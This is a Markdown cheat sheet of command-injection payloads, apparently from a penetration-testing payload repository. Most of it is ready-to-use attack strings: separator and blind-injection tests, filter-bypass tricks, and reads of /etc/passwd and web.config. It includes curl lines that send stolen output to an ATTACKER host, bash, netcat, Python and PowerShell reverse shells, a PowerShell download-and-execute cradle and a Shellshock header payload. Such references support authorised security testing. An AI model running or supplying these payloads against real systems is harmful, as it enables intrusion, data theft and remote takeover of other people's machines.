# 💻 Command Injection Payloads

```
 ██████╗ ███████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔═══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║   ██║███████╗    ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║   ██║╚════██║    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╔╝███████║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗                   
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║                   
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║                   
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║                   
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║                   
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                   
```

---

## 🎯 Command Separators

### Linux/Unix
```bash
;       # Semicolon - execute after
|       # Pipe - send output to next command
||      # OR - execute if first fails
&       # Background - execute in background
&&      # AND - execute if first succeeds
`cmd`   # Backticks - command substitution
$(cmd)  # Dollar - command substitution
\n      # Newline - separate commands
```

### Windows
```cmd
;       # Sometimes works
|       # Pipe
||      # OR
&       # Execute both
&&      # AND
\n      # Newline
%0a     # URL encoded newline
```

---

## 💉 Basic Payloads

### Simple Test
```bash
; id
; whoami
| id
| whoami
|| id
|| whoami
& id
& whoami
&& id
&& whoami
`id`
$(id)
```

### URL Encoded
```
%3B+id               # ; id
%7C+id               # | id
%7C%7C+id            # || id
%26+id               # & id
%26%26+id            # && id
%0A+id               # newline + id
```

---

## 🔥 Blind Command Injection

### Time-Based Detection
```bash
# Sleep commands
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows
; ping -n 5 127.0.0.1
| timeout 5
```

### DNS-Based Detection
```bash
# Using nslookup
; nslookup BURP_COLLAB
| nslookup BURP_COLLAB
`nslookup BURP_COLLAB`
$(nslookup BURP_COLLAB)

# Using curl/wget
; curl http://BURP_COLLAB
; wget http://BURP_COLLAB
$(curl http://ATTACKER/?data=$(whoami))
```

### HTTP-Based Exfiltration
```bash
; curl http://ATTACKER/$(whoami)
; curl http://ATTACKER/?d=$(cat /etc/passwd | base64)
; wget http://ATTACKER/$(hostname)
$(curl http://ATTACKER/?id=$(id))
`curl http://ATTACKER/?user=$(whoami)`
```

---

## 🛡️ Filter Bypass Techniques

### Space Bypass
```bash
# Using $IFS (Internal Field Separator)
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# Using tabs
;cat	/etc/passwd

# Using braces
{cat,/etc/passwd}
```

### Keyword Bypass
```bash
# Splitting commands
w'h'oami
w"h"oami
who$@ami
who\ami

# Using wildcards
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/b??/c?t /etc/passwd

# Using variables
$u; cat /etc/passwd
test=cat; $test /etc/passwd

# Hex encoding
echo -e "\x69\x64" | sh    # id
```

### Special Character Bypass
```bash
# Using different delimiters
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS/etc/passwd

# Newline injection
%0aid
%0Acat%20/etc/passwd

# Using comments
; id #
| id #
```

---

## 🐧 Linux Payloads

### File Reading
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; less /etc/passwd
; more /etc/passwd
; nl /etc/passwd
; sort /etc/passwd
; uniq /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
```

### Command Execution
```bash
; id
; whoami
; uname -a
; hostname
; pwd
; ls -la
; env
; ps aux
; netstat -an
; ifconfig
; ip addr
```

### Reverse Shell
```bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; nc -e /bin/sh ATTACKER 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

## 🪟 Windows Payloads

### Basic Commands
```cmd
& whoami
& hostname
& ipconfig
& net user
& dir
& type C:\Windows\win.ini
& type C:\Windows\System32\drivers\etc\hosts
```

### File Reading
```cmd
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Windows\win.ini
& find "password" C:\path\to\file.txt
```

### PowerShell
```powershell
& powershell -c "whoami"
& powershell -c "Get-Process"
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"
```

### Reverse Shell
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 📝 Common Injection Points

```
URL parameters:
  ?ip=127.0.0.1;id
  ?file=test.txt|id
  ?cmd=ls

POST parameters:
  filename=test.txt;id
  host=localhost|whoami

Headers:
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  X-Forwarded-For: ;id

File upload names:
  test;id;.txt
  test$(id).txt
  test`id`.txt
```

---

## 📋 Testing Checklist

```markdown
□ Test all command separators (; | || & && ` $())
□ Test URL encoded versions
□ Test time-based blind injection
□ Test DNS/HTTP exfiltration
□ Test space bypass ($IFS, tabs, braces)
□ Test keyword bypass (quotes, wildcards)
□ Test newline injection (%0a)
□ Check for filtered characters
□ Try both Linux and Windows commands
```

---

## 🔗 Related Payloads

- [LFI Payloads](./LFI.md)
- [SSTI Payloads](./SSTI.md)

---

**Back to Payloads:** [💉 Payloads Collection](./README.md)
